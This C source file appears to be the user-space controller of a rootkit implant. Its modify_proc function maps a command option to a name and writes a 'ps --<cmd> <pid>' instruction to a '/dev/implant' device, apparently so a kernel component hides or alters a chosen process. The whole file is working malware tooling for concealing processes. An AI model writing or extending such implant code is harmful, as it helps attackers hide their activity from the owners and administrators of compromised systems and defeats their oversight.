#include <hide_proc.h>
#include <debug.h>
#include <commands.h>

#include <stdio.h>

int modify_proc(pid_t pid, int c)
{
	char *cmd = NULL;
	int i;

	for (i = 0; proc_longopts[i].name != NULL; i++) {
		if (proc_longopts[i].val == c) {
			cmd = proc_longopts[i].name;
			break;
		}
	}

	if (cmd == NULL) {
		IMLOG_DEBUG("Unrecognised command to modify a process");
		return -1;
	}

	FILE *implant = fopen("/dev/implant", "w");
	if (implant == NULL) {
		IMLOG_WARN("Failed to access the implant interface");
		return -1;
	}

	int ret = fprintf(implant, "ps --%s %u\n", cmd, pid);
	if (ret < 0) {
		IMLOG_DEBUG("Failed to write to the implant interface");
		return -1;
	}

	fclose(implant);
	return 0;
}
